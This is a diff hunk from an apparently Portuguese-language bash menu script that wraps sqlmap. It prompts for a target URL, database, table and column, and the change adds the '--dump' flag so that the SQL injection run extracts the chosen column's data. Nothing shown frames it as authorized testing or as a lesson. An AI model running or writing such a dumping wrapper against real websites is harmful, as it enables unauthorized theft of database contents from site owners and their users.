@@ -81,7 +81,7 @@ echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
 read -p "[+]=> " coluna
 #
 #Extrai todo o trabalho feito
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna 
+python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna  --dump
 fi
 if [ "$opcao" = "3" ];then
 clear
